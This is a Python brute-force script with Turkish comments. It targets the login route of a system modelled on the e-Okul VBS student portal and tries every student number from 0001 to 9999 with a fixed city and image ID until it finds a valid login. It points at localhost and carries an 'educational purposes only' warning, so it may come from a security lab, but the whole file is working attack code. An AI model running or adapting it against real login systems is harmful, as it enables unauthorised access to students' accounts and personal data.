"""
e-Okul VBS Brute-Force Exploit Script
======================================
Bu script, /login rotasında rate limiting olmamasından faydalanarak
0001'den 9999'a kadar tüm öğrenci numaralarını deneyerek
geçerli giriş bilgilerini bulmaya çalışır.

UYARI: Bu script yalnızca eğitim amaçlıdır.
Gerçek sistemlerde bu tür saldırılar yasa dışıdır.
"""

import requests
import time

# ============================================================
# Hedef sunucu ayarları
# ============================================================
TARGET_URL = "http://localhost:3000/login"

# Sabit tutulan değerler (saldırgan bunları bildiğini varsayıyor)
CITY = "ANKARA"
SELECTED_IMAGE_ID = "3"

# Brute-force aralığı
START = 1
END = 9999

def brute_force():
    print("=" * 60)
    print("  e-Okul VBS Brute-Force Saldırısı Başlatılıyor...")
    print("=" * 60)
    print(f"  Hedef      : {TARGET_URL}")
    print(f"  Şehir      : {CITY}")
    print(f"  Resim ID   : {SELECTED_IMAGE_ID}")
    print(f"  Aralık     : {START:04d} - {END:04d}")
    print("=" * 60)
    print()

    start_time = time.time()
    attempted = 0

    for number in range(START, END + 1):
        student_no = f"{number:04d}"  # 0001, 0002, ..., 9999
        attempted += 1

        # Her 500 denemede bir ilerleme göster
        if attempted % 500 == 0:
            elapsed = time.time() - start_time
            rate = attempted / elapsed if elapsed > 0 else 0
            print(f"  [*] Deneniyor: {student_no}  |  {attempted}/{END} deneme  |  {rate:.0f} istek/sn")

        payload = {
            "city": CITY,
            "studentNo": student_no,
            "selectedImageId": SELECTED_IMAGE_ID
        }

        try:
            response = requests.post(TARGET_URL, json=payload)
            data = response.json()

            if data.get("success"):
                elapsed = time.time() - start_time
                print()
                print("!" * 60)
                print(f"  [+] BASARILI GIRIS BULUNDU!")
                print(f"  [+] Ogrenci Numarasi : {student_no}")
                print(f"  [+] Sehir            : {CITY}")
                print(f"  [+] Resim ID         : {SELECTED_IMAGE_ID}")
                print(f"  [+] Sunucu Yaniti    : {data.get('message')}")
                print(f"  [+] Toplam Deneme    : {attempted}")
                print(f"  [+] Gecen Sure       : {elapsed:.2f} saniye")
                print("!" * 60)
                return

        except requests.exceptions.ConnectionError:
            print(f"  [!] Sunucuya bağlanılamıyor! Sunucunun çalıştığından emin olun.")
            return
        except Exception as e:
            print(f"  [!] Hata: {e}")
            continue

    elapsed = time.time() - start_time
    print()
    print("-" * 60)
    print(f"  [-] Gecerli numara bulunamadi.")
    print(f"  [-] Toplam {attempted} deneme yapildi ({elapsed:.2f} saniye)")
    print("-" * 60)


if __name__ == "__main__":
    brute_force()
